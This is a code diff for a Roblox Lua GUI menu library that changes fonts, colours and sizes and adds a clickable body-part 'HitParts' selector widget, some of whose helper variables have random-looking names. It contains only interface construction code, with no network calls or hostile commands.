@@ -1,14 +1,22 @@
+-- // make multiselect in order
+-- // add border pixel math to dragging
+-- // containers canvasscroll update on setvisible
+-- // Dragging sys has errors
+-- // I think something was wrong with the keybinds/indicators tweening
+-- // Menu Effects (OnHover, OnClick)
+
+
 local Settings = {
-    Accent = Color3.fromHex("#8F30A7"),
-    Font = Enum.Font.Arcade,
+    Accent = Color3.fromHex("#FF0000"),
+    Font = Enum.Font.SourceSans,
     IsBackgroundTransparent = true,
     Rounded = false,
     Dim = false,
     
     ItemColor = Color3.fromRGB(30, 30, 30),
     BorderColor = Color3.fromRGB(45, 45, 45),
-    MinSize = Vector2.new(450, 380),
-    MaxSize = Vector2.new(10000, 10000)
+    MinSize = Vector2.new(500, 400),
+    MaxSize = Vector2.new(500, 400)
 }
 
 
@@ -137,7 +145,7 @@ local function CreateLabel(Parent: Instance, Name: string, Text: string, Size: U
     Label.BackgroundTransparency = 1
     Label.Size = Size or UDim2.new(1, 0, 0, 15)
     Label.Position = Position or UDim2.new()
-    Label.Font = Enum.Font.Arcade
+    Label.Font = Enum.Font.SourceSans
     Label.Text = Text or ""
     Label.TextColor3 = Color3.new(1, 1, 1)
     Label.TextSize = 14
@@ -247,7 +255,7 @@ MenuScaler_Button.BorderColor3 = Color3.fromRGB(40, 40, 40)
 MenuScaler_Button.BorderSizePixel = 0
 MenuScaler_Button.Position = UDim2.new(1, -15, 1, -15)
 MenuScaler_Button.Size = UDim2.fromOffset(15, 15)
-MenuScaler_Button.Font = Enum.Font.Arcade
+MenuScaler_Button.Font = Enum.Font.SourceSans
 MenuScaler_Button.Text = ""
 MenuScaler_Button.TextColor3 = Color3.new(1, 1, 1)
 MenuScaler_Button.TextSize = 14
@@ -287,7 +295,7 @@ Title_Label.Name = "Title"
 Title_Label.BackgroundTransparency = 1
 Title_Label.Position = UDim2.new(0, 5, 0, 0)
 Title_Label.Size = UDim2.new(1, -10, 0, 15)
-Title_Label.Font = Enum.Font.Arcade
+Title_Label.Font = Enum.Font.SourceSans
 Title_Label.Text = ""
 Title_Label.TextColor3 = Color3.new(1, 1, 1)
 Title_Label.TextSize = 14
@@ -331,7 +339,7 @@ ToolTip_Label.AutomaticSize = Enum.AutomaticSize.XY
 ToolTip_Label.Size = UDim2.fromOffset(0, 0, 0, 15)
 ToolTip_Label.Text = ""
 ToolTip_Label.TextSize = 14
-ToolTip_Label.Font = Enum.Font.Arcade
+ToolTip_Label.Font = Enum.Font.SourceSans
 ToolTip_Label.TextColor3 = Color3.new(1, 1, 1)
 ToolTip_Label.ZIndex = 5
 ToolTip_Label.Visible = false
@@ -576,7 +584,7 @@ function Menu.Tab(Tab_Name: string): Tab
     Button.Name = "Button"
     Button.BackgroundColor3 = Menu.ItemColor
     Button.BorderSizePixel = 0
-    Button.Font = Enum.Font.Arcade
+    Button.Font = Enum.Font.SourceSans
     Button.Text = Tab_Name
     Button.TextColor3 = Color3.fromRGB(205, 205, 205)
     Button.TextSize = 14
@@ -676,6 +684,154 @@ function Menu.Container(Tab_Name: string, Container_Name: string, Side: string):
 end
 
 
+local TweenService = game:GetService("TweenService")
+
+function Menu.BodyPart(Tab_Name: string, Container_Name: string, Side: string, Callback: any): BodyPart
+    local Tab = GetTab(Tab_Name)
+    assert(typeof(Tab_Name) == "string", "TAB_NAME REQUIRED")
+    if Tab[Container_Name] then return error("CONTAINER_NAME '" .. tostring(Container_Name) .. "' ALREADY EXISTS") end
+    local Side = Side or "Left"
+
+    local Frame = Instance.new("Frame")
+    local Label = CreateLabel(Frame, "Title", Container_Name, UDim2.fromOffset(206, 15), UDim2.fromOffset(5, 0))
+    local Line = CreateLine(Frame, UDim2.new(1, -10, 0, 1), UDim2.fromOffset(5, 15))
+
+    local BodyPart = {self = Frame, Height = 0}
+    BodyPart.Class = "BodyPart"
+    BodyPart.Visible = true
+    BodyPart.Callback = typeof(Callback) == "function" and Callback or function() end
+
+    function BodyPart:SetLabel(Name: string)
+        Label.Text = tostring(Name)
+    end
+
+    function BodyPart:SetVisible(Visible: boolean)
+        if typeof(Visible) ~= "boolean" then return end
+        if self.Visible == Visible then return end
+        
+        Frame.Visible = Visible
+        self.Visible = Visible
+        self:UpdateSize(Visible and 25 or -25, Frame)
+    end
+
+    function BodyPart:UpdateSize(Height: float, Item: GuiObject)
+        self.Height += Height
+        Frame.Size += UDim2.fromOffset(0, Height)
+        Tab.self[Side].CanvasSize += UDim2.fromOffset(0, Height)
+
+        if Item then
+            local ItemY = Item.AbsolutePosition.Y
+            if math.sign(Height) == 1 then
+                ItemY -= 1
+            end
+
+            for _, item in ipairs(Frame:GetChildren()) do
+                if (item == Label or item == Line or item == Stroke or Item == item) then continue end
+                local item_y = item.AbsolutePosition.Y
+                if item_y > ItemY then
+                    item.Position += UDim2.fromOffset(0, Height)
+                end
+            end
+        end
+    end
+
+    function BodyPart:GetHeight(): number
+        return self.Height
+    end
+
+    Frame.Name = "BodyPart"
+    Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    Frame.BorderColor3 = Color3.new()
+    Frame.BorderMode = Enum.BorderMode.Inset
+    Frame.Size = UDim2.new(0, 200, 0, 190)
+    Frame.Parent = Tab.self[Side]
+
+    BodyPart:UpdateSize(25)
+    Tab.self[Side].CanvasSize += UDim2.fromOffset(0, 10)
+    Tab[Container_Name] = BodyPart
+
+    local function iQerX9Vxz(TrfkJ2zX)
+        local BodyPartFrame = Instance.new("Frame")
+        BodyPartFrame.Name = TrfkJ2zX
+        BodyPartFrame.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
+        BodyPartFrame.BorderSizePixel = 1
+        BodyPartFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+        BodyPartFrame.Parent = Frame
+
+        if TrfkJ2zX == "Head" then
+            BodyPartFrame.Size = UDim2.new(0, 30, 0, 30)
+            BodyPartFrame.Position = UDim2.new(0.5, -15, 0, 10)
+        elseif TrfkJ2zX == "UpperTorso" then
+            BodyPartFrame.Size = UDim2.new(0, 50, 0, 35)
+            BodyPartFrame.Position = UDim2.new(0.5, -25, 0, 40)
+        elseif TrfkJ2zX == "LowerTorso" then
+            BodyPartFrame.Size = UDim2.new(0, 50, 0, 35)
+            BodyPartFrame.Position = UDim2.new(0.5, -25, 0, 75)
+        elseif TrfkJ2zX == "HumanoidRootPart" then
+            BodyPartFrame.Size = UDim2.new(0, 20, 0, 20)
+            BodyPartFrame.Position = UDim2.new(0.5, -7, 0.5, -35)
+
+        elseif TrfkJ2zX == "UpperLeftArm" then
+            BodyPartFrame.Size = UDim2.new(0, 20, 0, 35)
+            BodyPartFrame.Position = UDim2.new(0.5, -40, 0, 40)
+        elseif TrfkJ2zX == "LowerLeftArm" then
+            BodyPartFrame.Size = UDim2.new(0, 20, 0, 35)
+            BodyPartFrame.Position = UDim2.new(0.5, -40, 0, 75)
+        elseif TrfkJ2zX == "UpperRightArm" then
+            BodyPartFrame.Size = UDim2.new(0, 20, 0, 35)
+            BodyPartFrame.Position = UDim2.new(0.5, 25, 0, 40)
+        elseif TrfkJ2zX == "LowerRightArm" then
+            BodyPartFrame.Size = UDim2.new(0, 20, 0, 35)
+            BodyPartFrame.Position = UDim2.new(0.5, 25, 0, 75)
+
+        elseif TrfkJ2zX == "UpperLeftLeg" then
+            BodyPartFrame.Size = UDim2.new(0, 23, 0, 35)
+            BodyPartFrame.Position = UDim2.new(0.5, -22.5, 0, 110)
+        elseif TrfkJ2zX == "LowerLeftLeg" then
+            BodyPartFrame.Size = UDim2.new(0, 23, 0, 35)
+            BodyPartFrame.Position = UDim2.new(0.5, -22.5, 0, 145)
+        elseif TrfkJ2zX == "UpperRightLeg" then
+            BodyPartFrame.Size = UDim2.new(0, 23, 0, 35)
+            BodyPartFrame.Position = UDim2.new(0.5, 2.5, 0, 110)
+        elseif TrfkJ2zX == "LowerRightLeg" then
+            BodyPartFrame.Size = UDim2.new(0, 23, 0, 35)
+            BodyPartFrame.Position = UDim2.new(0.5, 2.5, 0, 145)
+        end
+
+        local Button = Instance.new("TextButton")
+        Button.Size = UDim2.new(1, 0, 1, 0)
+        Button.Position = UDim2.new(0, 0, 0, 0)
+        Button.BackgroundTransparency = 1
+        Button.Text = ""
+        Button.Parent = BodyPartFrame
+
+        Button.MouseButton1Click:Connect(function()
+            
+            local ZxFcg6N8 = BodyPartFrame.BackgroundColor3
+            local qErTy1v3 = ZxFcg6N8 == Color3.fromRGB(200, 200, 200) and Menu.Accent or Color3.fromRGB(200, 200, 200)
+
+            local tween = TweenService:Create(BodyPartFrame, TweenInfo.new(0.5), { BackgroundColor3 = qErTy1v3 })
+            tween:Play()
+
+            BodyPart.Callback(TrfkJ2zX)
+        end)
+
+        return BodyPartFrame
+    end
+
+    local jKurO1qtU = {
+        "Head", "UpperTorso", "LowerTorso", "HumanoidRootPart",
+        "UpperLeftArm", "LowerLeftArm", "UpperRightArm", "LowerRightArm",
+        "UpperLeftLeg", "LowerLeftLeg", "UpperRightLeg", "LowerRightLeg"
+    }
+
+    for _, part in ipairs(jKurO1qtU) do
+        iQerX9Vxz(part)
+    end
+
+    return BodyPart
+end
+
 function Menu.Label(Tab_Name: string, Container_Name: string, Name: string, ToolTip: string): Label
     local Container = GetContainer(Tab_Name, Container_Name)
     local GuiLabel = CreateLabel(Container.self, "Label", Name, nil, UDim2.fromOffset(20, Container:GetHeight()))
@@ -748,7 +904,7 @@ function Menu.Button(Tab_Name: string, Container_Name: string, Name: string, Cal
     GuiButton.BorderMode = Enum.BorderMode.Inset
     GuiButton.Position = UDim2.fromOffset(20, Container:GetHeight())
     GuiButton.Size = UDim2.new(1, -50, 0, 20)
-    GuiButton.Font = Enum.Font.Arcade
+    GuiButton.Font = Enum.Font.SourceSansSemibold
     GuiButton.Text = Name
     GuiButton.TextColor3 = Color3.new(1, 1, 1)
     GuiButton.TextSize = 14
@@ -820,7 +976,7 @@ function Menu.TextBox(Tab_Name: string, Container_Name: string, Name: string, Va
     GuiTextBox.BorderMode = Enum.BorderMode.Inset
     GuiTextBox.Position = UDim2.fromOffset(0, 20)
     GuiTextBox.Size = UDim2.new(1, -50, 0, 20)
-    GuiTextBox.Font = Enum.Font.Arcade
+    GuiTextBox.Font = Enum.Font.SourceSansSemibold
     GuiTextBox.Text = TextBox.Value
     GuiTextBox.TextColor3 = Color3.new(1, 1, 1)
     GuiTextBox.TextSize = 14
@@ -908,7 +1064,7 @@ function Menu.CheckBox(Tab_Name: string, Container_Name: string, Name: string, B
     Button.BackgroundColor3 = Menu.ItemColor
     Button.BorderColor3 = Color3.new()
     Button.Position = UDim2.fromOffset(-14, 4)
-    Button.Size = UDim2.fromOffset(12, 12)
+    Button.Size = UDim2.fromOffset(8, 8)
     Button.Text = ""
     Button.Parent = Label
     AddEventListener(Button, function()
@@ -990,7 +1146,7 @@ function Menu.Hotkey(Tab_Name: string, Container_Name: string, Name: string, Key
     Button.BackgroundTransparency = 1
     Button.Position = UDim2.new(1, -100, 0, 4)
     Button.Size = UDim2.fromOffset(75, 8)
-    Button.Font = Enum.Font.Arcade
+    Button.Font = Enum.Font.SourceSans
     Button.Text = Key and "[" .. Key.Name .. "]" or "[None]"
     Button.TextColor3 = Color3.new(1, 1, 1)
     Button.TextSize = 12
@@ -1016,7 +1172,7 @@ function Menu.Hotkey(Tab_Name: string, Container_Name: string, Name: string, Key
     HotkeyToggle.BorderSizePixel = 0
     HotkeyToggle.Position = UDim2.new()
     HotkeyToggle.Size = UDim2.new(1, 0, 0, 13)
-    HotkeyToggle.Font = Enum.Font.Arcade
+    HotkeyToggle.Font = Enum.Font.SourceSans
     HotkeyToggle.Text = "Toggle"
     HotkeyToggle.TextColor3 = Menu.Accent
     HotkeyToggle.TextSize = 14
@@ -1040,7 +1196,7 @@ function Menu.Hotkey(Tab_Name: string, Container_Name: string, Name: string, Key
     HotkeyHold.BorderSizePixel = 0
     HotkeyHold.Position = UDim2.new(0, 0, 0, 15)
     HotkeyHold.Size = UDim2.new(1, 0, 0, 13)
-    HotkeyHold.Font = Enum.Font.Arcade
+    HotkeyHold.Font = Enum.Font.SourceSans
     HotkeyHold.Text = "Hold"
     HotkeyHold.TextColor3 = Color3.new(1, 1, 1)
     HotkeyHold.TextSize = 14
@@ -1184,7 +1340,7 @@ function Menu.Slider(Tab_Name: string, Container_Name: string, Name: string, Min
     ValueBox.BackgroundTransparency = 1
     ValueBox.Position = UDim2.new(1, -65, 0, 5)
     ValueBox.Size = UDim2.fromOffset(50, 10)
-    ValueBox.Font = Enum.Font.Arcade
+    ValueBox.Font = Enum.Font.SourceSans
     ValueBox.Text = ""
     ValueBox.TextColor3 = Color3.new(1, 1, 1)
     ValueBox.TextSize = 12
@@ -1202,7 +1358,7 @@ function Menu.Slider(Tab_Name: string, Container_Name: string, Name: string, Min
     ValueLabel.BackgroundTransparency = 1
     ValueLabel.Position = UDim2.new(1, 0, 0, 2)
     ValueLabel.Size = UDim2.new(0, 0, 1, 0)
-    ValueLabel.Font = Enum.Font.Arcade
+    ValueLabel.Font = Enum.Font.SourceSansBold
     ValueLabel.Text = ""
     ValueLabel.TextColor3 = Color3.new(1, 1, 1)
     ValueLabel.TextSize = 14
@@ -1328,7 +1484,7 @@ function Menu.ColorPicker(Tab_Name: string, Container_Name: string, Name: string
     Button.BorderColor3 = Color3.new()
     Button.Position = UDim2.new(1, -35, 0, 4)
     Button.Size = UDim2.fromOffset(20, 8)
-    Button.Font = Enum.Font.Arcade
+    Button.Font = Enum.Font.SourceSans
     Button.Text = ""
     Button.TextColor3 = Color3.new(1, 1, 1)
     Button.TextSize = 12
@@ -1358,7 +1514,7 @@ function Menu.ColorPicker(Tab_Name: string, Container_Name: string, Name: string
     HexBox.Size = UDim2.new(1, -10, 0, 20)
     HexBox.Position = UDim2.fromOffset(5, 150)
     HexBox.Text = "#" .. string.upper(ColorPicker.Color:ToHex())
-    HexBox.Font = Enum.Font.Arcade
+    HexBox.Font = Enum.Font.SourceSansSemibold
     HexBox.TextSize = 14
     HexBox.TextColor3 = Color3.new(1, 1, 1)
     HexBox.ClearTextOnFocus = false
@@ -1525,161 +1681,153 @@ end
 
 local TweenService = game:GetService("TweenService")
 
-function Menu.BodyPart(Tab_Name: string, Container_Name: string, Side: string, Callback: any): BodyPart
-    local Tab = GetTab(Tab_Name)
-    assert(typeof(Tab_Name) == "string", "TAB_NAME REQUIRED")
-    if Tab[Container_Name] then return error("CONTAINER_NAME '" .. tostring(Container_Name) .. "' ALREADY EXISTS") end
-    local Side = Side or "Left"
+function Menu.HitParts(Tab_Name: string, Container_Name: string, Name: string, Callback: any, ToolTip: string): HitParts
+    local Container = GetContainer(Tab_Name, Container_Name)
+    local Label = CreateLabel(Container.self, "HitParts", Name, UDim2.new(1, -10, 0, 15), UDim2.fromOffset(20, Container:GetHeight()))
+    local Button = Instance.new("TextButton")
+    local Selected_HitParts = Instance.new("Frame")
 
-    local Frame = Instance.new("Frame")
-    local Label = CreateLabel(Frame, "Title", Container_Name, UDim2.fromOffset(206, 15), UDim2.fromOffset(5, 0))
-    local Line = CreateLine(Frame, UDim2.new(1, -10, 0, 1), UDim2.fromOffset(5, 15))
+    local HitParts = {self = Label}
+    HitParts.Name = Name
+    HitParts.Tab = Tab_Name
+    HitParts.Class = "HitParts"
+    HitParts.Container = Container_Name
+    HitParts.Index = #Items + 1
+    HitParts.Callback = typeof(Callback) == "function" and Callback or function() end
 
-    local BodyPart = {self = Frame, Height = 0}
-    BodyPart.Class = "BodyPart"
-    BodyPart.Visible = true
-    BodyPart.Callback = typeof(Callback) == "function" and Callback or function() end
-
-    function BodyPart:SetLabel(Name: string)
-        Label.Text = tostring(Name)
-    end
-
-    function BodyPart:SetVisible(Visible: boolean)
-        if typeof(Visible) ~= "boolean" then return end
-        if self.Visible == Visible then return end
-        
-        Frame.Visible = Visible
-        self.Visible = Visible
-        self:UpdateSize(Visible and 25 or -25, Frame)
-    end
-
-    function BodyPart:UpdateSize(Height: float, Item: GuiObject)
-        self.Height += Height
-        Frame.Size += UDim2.fromOffset(0, Height)
-        Tab.self[Side].CanvasSize += UDim2.fromOffset(0, Height)
-
-        if Item then
-            local ItemY = Item.AbsolutePosition.Y
-            if math.sign(Height) == 1 then
-                ItemY -= 1
-            end
-
-            for _, item in ipairs(Frame:GetChildren()) do
-                if (item == Label or item == Line or item == Stroke or Item == item) then continue end
-                local item_y = item.AbsolutePosition.Y
-                if item_y > ItemY then
-                    item.Position += UDim2.fromOffset(0, Height)
-                end
-            end
-        end
-    end
-
-    function BodyPart:GetHeight(): number
-        return self.Height
-    end
-
-    Frame.Name = "BodyPart"
-    Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-    Frame.BorderColor3 = Color3.new()
-    Frame.BorderMode = Enum.BorderMode.Inset
-    Frame.Size = UDim2.new(0, 190, 0, 180)
-    Frame.Parent = Tab.self[Side]
-
-    BodyPart:UpdateSize(25)
-    Tab.self[Side].CanvasSize += UDim2.fromOffset(0, 10)
-    Tab[Container_Name] = BodyPart
-
-    local selectedPart = nil
-
-    local function createBodyPartFrame(partName)
+    local function xvBn23AdeR(xGtaW2x3F)
         local BodyPartFrame = Instance.new("Frame")
-        BodyPartFrame.Name = partName
-        BodyPartFrame.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
+        BodyPartFrame.Name = xGtaW2x3F
+        BodyPartFrame.BackgroundColor3 = Color3.fromRGB(200, 200, 200) 
         BodyPartFrame.BorderSizePixel = 1
         BodyPartFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
-        BodyPartFrame.Parent = Frame
+        BodyPartFrame.Parent = Selected_HitParts
 
-        -- Lower the position of each body part frame
-        local lowerOffset = 9 -- Adjust this value to lower the body parts further
-        if partName == "Head" then
+        if xGtaW2x3F == "Head" then
             BodyPartFrame.Size = UDim2.new(0, 30, 0, 30)
-            BodyPartFrame.Position = UDim2.new(0.5, -15, 0, 10 + lowerOffset) -- Lowered by lowerOffset
-        elseif partName == "UpperTorso" then
+            BodyPartFrame.Position = UDim2.new(0.5, -15, 0, 10)
+        elseif xGtaW2x3F == "UpperTorso" then
             BodyPartFrame.Size = UDim2.new(0, 50, 0, 35)
-            BodyPartFrame.Position = UDim2.new(0.5, -25, 0, 40 + lowerOffset)
-        elseif partName == "LowerTorso" then
-            BodyPartFrame.Size = UDim2.new(0, 50, 0, 35)
-            BodyPartFrame.Position = UDim2.new(0.5, -25, 0, 75 + lowerOffset)
-        elseif partName == "HumanoidRootPart" then
+            BodyPartFrame.Position = UDim2.new(0.5, -25, 0, 40)
+        elseif xGtaW2x3F == "LowerTorso" then
+            BodyPartFrame.Size = UDim2.new(0, 50, 0, 35) 
+            BodyPartFrame.Position = UDim2.new(0.5, -25, 0, 75) 
+        elseif xGtaW2x3F == "HumanoidRootPart" then
             BodyPartFrame.Size = UDim2.new(0, 20, 0, 20)
-            BodyPartFrame.Position = UDim2.new(0.5, -7, 0.5, -35 + lowerOffset)
+            BodyPartFrame.Position = UDim2.new(0.5, -7, 0.5, -20)
 
-        elseif partName == "UpperLeftArm" then
+        elseif xGtaW2x3F == "UpperLeftArm" then
             BodyPartFrame.Size = UDim2.new(0, 20, 0, 35)
-            BodyPartFrame.Position = UDim2.new(0.5, -40, 0, 40 + lowerOffset)
-        elseif partName == "LowerLeftArm" then
+            BodyPartFrame.Position = UDim2.new(0.5, -40, 0, 40)
+        elseif xGtaW2x3F == "LowerLeftArm" then
             BodyPartFrame.Size = UDim2.new(0, 20, 0, 35)
-            BodyPartFrame.Position = UDim2.new(0.5, -40, 0, 75 + lowerOffset)
-        elseif partName == "UpperRightArm" then
+            BodyPartFrame.Position = UDim2.new(0.5, -40, 0, 75)
+        elseif xGtaW2x3F == "UpperRightArm" then
             BodyPartFrame.Size = UDim2.new(0, 20, 0, 35)
-            BodyPartFrame.Position = UDim2.new(0.5, 25, 0, 40 + lowerOffset)
-        elseif partName == "LowerRightArm" then
+            BodyPartFrame.Position = UDim2.new(0.5, 25, 0, 40)
+        elseif xGtaW2x3F == "LowerRightArm" then
             BodyPartFrame.Size = UDim2.new(0, 20, 0, 35)
-            BodyPartFrame.Position = UDim2.new(0.5, 25, 0, 75 + lowerOffset)
+            BodyPartFrame.Position = UDim2.new(0.5, 25, 0, 75)
 
-        elseif partName == "UpperLeftLeg" then
+        elseif xGtaW2x3F == "UpperLeftLeg" then
             BodyPartFrame.Size = UDim2.new(0, 23, 0, 35)
-            BodyPartFrame.Position = UDim2.new(0.5, -22.5, 0, 110 + lowerOffset)
-        elseif partName == "LowerLeftLeg" then
+            BodyPartFrame.Position = UDim2.new(0.5, -22.5, 0, 110) 
+        elseif xGtaW2x3F == "LowerLeftLeg" then
+            BodyPartFrame.Size = UDim2.new(0, 23, 0, 35) 
+            BodyPartFrame.Position = UDim2.new(0.5, -22.5, 0, 145) 
+        elseif xGtaW2x3F == "UpperRightLeg" then
             BodyPartFrame.Size = UDim2.new(0, 23, 0, 35)
-            BodyPartFrame.Position = UDim2.new(0.5, -22.5, 0, 145 + lowerOffset)
-        elseif partName == "UpperRightLeg" then
+            BodyPartFrame.Position = UDim2.new(0.5, 2.5, 0, 110) 
+        elseif xGtaW2x3F == "LowerRightLeg" then
             BodyPartFrame.Size = UDim2.new(0, 23, 0, 35)
-            BodyPartFrame.Position = UDim2.new(0.5, 2.5, 0, 110 + lowerOffset)
-        elseif partName == "LowerRightLeg" then
-            BodyPartFrame.Size = UDim2.new(0, 23, 0, 35)
-            BodyPartFrame.Position = UDim2.new(0.5, 2.5, 0, 145 + lowerOffset)
+            BodyPartFrame.Position = UDim2.new(0.5, 2.5, 0, 145)
         end
 
-        local Button = Instance.new("TextButton")
-        Button.Size = UDim2.new(1, 0, 1, 0)
-        Button.Position = UDim2.new(0, 0, 0, 0)
-        Button.BackgroundTransparency = 1
-        Button.Text = ""
-        Button.Parent = BodyPartFrame
+        local tY6yruKae = Instance.new("TextButton")
+        tY6yruKae.Size = UDim2.new(1, 0, 1, 0)
+        tY6yruKae.Position = UDim2.new(0, 0, 0, 0)
+        tY6yruKae.BackgroundTransparency = 1
+        tY6yruKae.Text = ""
+        tY6yruKae.Parent = BodyPartFrame
 
-        Button.MouseButton1Click:Connect(function()
-            -- Reset previously selected part color
-            if selectedPart and selectedPart ~= BodyPartFrame then
-                selectedPart.BackgroundColor3 = Color3.fromRGB(200, 200, 200) -- Reset color
-            end
+        tY6yruKae.MouseButton1Click:Connect(function()
+            local uI6xm90Laq = BodyPartFrame.BackgroundColor3
+            local b5x3weT = uI6xm90Laq == Color3.fromRGB(200, 200, 200) and Color3.fromRGB(143, 48, 167) or Color3.fromRGB(200, 200, 200)
 
-            
-            selectedPart = BodyPartFrame
-            local ZxFcg6N8 = BodyPartFrame.BackgroundColor3
-            local qErTy1v3 = ZxFcg6N8 == Color3.fromRGB(200, 200, 200) and Menu.Accent or Color3.fromRGB(200, 200, 200)
-
-            local tween = TweenService:Create(BodyPartFrame, TweenInfo.new(0.5), { BackgroundColor3 = qErTy1v3 })
+            local tween = TweenService:Create(BodyPartFrame, TweenInfo.new(0.5), { BackgroundColor3 = b5x3weT })
             tween:Play()
 
-            BodyPart.Callback(partName)
+            HitParts.Callback(xGtaW2x3F)
         end)
 
         return BodyPartFrame
     end
 
-    local bodyParts = {
-        "Head", "UpperTorso", "LowerTorso", "HumanoidRootPart",
-        "UpperLeftArm", "LowerLeftArm", "UpperRightArm", "LowerRightArm",
-        "UpperLeftLeg", "LowerLeftLeg", "UpperRightLeg", "LowerRightLeg"
-    }
+    local tYumRqw = {"Head", "UpperTorso", "LowerTorso", "HumanoidRootPart", 
+                     "UpperLeftArm", "LowerLeftArm", "UpperRightArm", "LowerRightArm", 
+                     "UpperLeftLeg", "LowerLeftLeg", "UpperRightLeg", "LowerRightLeg"}
 
-    for _, part in ipairs(bodyParts) do
-        createBodyPartFrame(part)
+    for _, part in ipairs(tYumRqw) do
+        xvBn23AdeR(part)
     end
 
-    return BodyPart
+    function HitParts:Update()
+
+    end
+
+    function HitParts:SetLabel(Name: string)
+        Label.Text = tostring(Name)
+    end
+
+    function HitParts:SetVisible(Visible: boolean)
+        if typeof(Visible) ~= "boolean" then return end
+        if Label.Visible == Visible then return end
+        
+        Label.Visible = Visible
+        Container:UpdateSize(Visible and 20 or -20, Label)
+    end
+
+    Label.MouseEnter:Connect(function()
+        if ToolTip then
+            Menu:SetToolTip(true, ToolTip, Label)
+        end
+    end)
+    Label.MouseLeave:Connect(function()
+        if ToolTip then
+            Menu:SetToolTip(false, ToolTip)
+        end
+    end)
+
+    Button.Name = "HitParts"
+    Button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    Button.BorderColor3 = Color3.new()
+    Button.Position = UDim2.new(1, -35, 0, 4)
+    Button.Size = UDim2.fromOffset(20, 8)
+    Button.Font = Enum.Font.SourceSans
+    Button.Text = ""
+    Button.TextColor3 = Color3.new(1, 1, 1)
+    Button.TextSize = 12
+    Button.Parent = Label
+    Button.MouseButton1Click:Connect(function()
+        UpdateSelected(Selected_HitParts, Button, UDim2.fromOffset(20, 20))
+    end)
+
+    Selected_HitParts.Name = "Selected_HitParts"
+    Selected_HitParts.Visible = false
+    Selected_HitParts.BackgroundColor3 = Menu.ItemColor
+    Selected_HitParts.BorderColor3 = Menu.BorderColor
+    Selected_HitParts.BorderMode = Enum.BorderMode.Inset
+    Selected_HitParts.Position = UDim2.new(0, 200, 0, 170)
+    Selected_HitParts.Size = UDim2.new(0, 190, 0, 180)
+    Selected_HitParts.Parent = nil
+    CreateStroke(Selected_HitParts, Color3.new(), 1)
+
+    Container:UpdateSize(20)
+    table.insert(Items, HitParts)
+    return #Items
 end
+
+
 
 
 function Menu.ComboBox(Tab_Name: string, Container_Name: string, Name: string, Value: string, Value_Items: table, Callback: any, ToolTip: string): ComboBox
@@ -1712,7 +1860,7 @@ function Menu.ComboBox(Tab_Name: string, Container_Name: string, Name: string, V
         Button.BorderColor3 = Color3.new()
         Button.BorderSizePixel = 0
         Button.Size = UDim2.new(1, 0, 0, 15)
-        Button.Font = Enum.Font.Arcade
+        Button.Font = Enum.Font.SourceSans
         Button.Text = tostring(Name)
         Button.TextColor3 = ComboBox.Value == Button.Text and Menu.Accent or Color3.new(1, 1, 1)
         Button.TextSize = 14
@@ -1806,7 +1954,7 @@ function Menu.ComboBox(Tab_Name: string, Container_Name: string, Name: string, V
     Button.BorderColor3 = Color3.new()
     Button.Position = UDim2.new(0, 0, 0, 20)
     Button.Size = UDim2.new(1, -40, 0, 15)
-    Button.Font = Enum.Font.Arcade
+    Button.Font = Enum.Font.SourceSans
     Button.Text = ComboBox.Value
     Button.TextColor3 = Color3.new(1, 1, 1)
     Button.TextSize = 14
@@ -1826,7 +1974,7 @@ function Menu.ComboBox(Tab_Name: string, Container_Name: string, Name: string, V
     Symbol.BackgroundTransparency = 1
     Symbol.Position = UDim2.new(1, -10, 0, 0)
     Symbol.Size = UDim2.new(0, 5, 1, 0)
-    Symbol.Font = Enum.Font.Arcade
+    Symbol.Font = Enum.Font.SourceSans
     Symbol.Text = "-"
     Symbol.TextColor3 = Color3.new(1, 1, 1)
     Symbol.TextSize = 14
@@ -1896,7 +2044,7 @@ function Menu.MultiSelect(Tab_Name: string, Container_Name: string, Name: string
         Button.BorderColor3 = Color3.new()
         Button.BorderSizePixel = 0
         Button.Size = UDim2.new(1, 0, 0, 15)
-        Button.Font = Enum.Font.Arcade
+        Button.Font = Enum.Font.SourceSans
         Button.Text = Name
         Button.TextColor3 = Checked and Menu.Accent or Color3.new(1, 1, 1)
         Button.TextSize = 14
@@ -1980,7 +2128,7 @@ function Menu.MultiSelect(Tab_Name: string, Container_Name: string, Name: string
     Button.BorderColor3 = Color3.new()
     Button.Position = UDim2.new(0, 0, 0, 20)
     Button.Size = UDim2.new(1, -40, 0, 15)
-    Button.Font = Enum.Font.Arcade
+    Button.Font = Enum.Font.SourceSans
     Button.Text = "[...]"
     Button.TextColor3 = Color3.new(1, 1, 1)
     Button.TextSize = 14
@@ -1998,7 +2146,7 @@ function Menu.MultiSelect(Tab_Name: string, Container_Name: string, Name: string
     Symbol.BackgroundTransparency = 1
     Symbol.Position = UDim2.new(1, -10, 0, 0)
     Symbol.Size = UDim2.new(0, 5, 1, 0)
-    Symbol.Font = Enum.Font.Arcade
+    Symbol.Font = Enum.Font.SourceSans
     Symbol.Text = "-"
     Symbol.TextColor3 = Color3.new(1, 1, 1)
     Symbol.TextSize = 14
@@ -2070,7 +2218,7 @@ function Menu.ListBox(Tab_Name: string, Container_Name: string, Name: string, Mu
         Button.BorderColor3 = Color3.new()
         Button.BorderSizePixel = 0
         Button.Size = UDim2.new(1, 0, 0, 15)
-        Button.Font = Enum.Font.Arcade
+        Button.Font = Enum.Font.SourceSans
         Button.Text = Name
         Button.TextSize = 14
         Button.TextXAlignment = Enum.TextXAlignment.Left
@@ -2246,7 +2394,7 @@ function Menu.Notify(Content: string, Delay: number)
     Text.Position = UDim2.new(0.5, -100, 1, -150 - (GetDictionaryLength(Notifications) * 15))
     Text.Size = UDim2.new(0, 0, 0, 15)
     Text.Text = Content
-    Text.Font = Enum.Font.Arcade
+    Text.Font = Enum.Font.SourceSans
     Text.TextSize = 17
     Text.TextColor3 = Color3.new(1, 1, 1)
     Text.TextStrokeTransparency = 0.2
@@ -2325,7 +2473,7 @@ function Menu.Prompt(Message: string, Callback: any, ...)
         Button.Text = Text
         Button.TextStrokeTransparency = 0.8
         Button.TextSize = 14
-        Button.Font = Enum.Font.Arcade
+        Button.Font = Enum.Font.SourceSans
         Button.TextColor3 = Color3.new(1, 1, 1)
         Button.Parent = Prompt
         Button.MouseButton1Click:Connect(function() Prompt:Destroy() Callback(unpack(Arguments)) end)
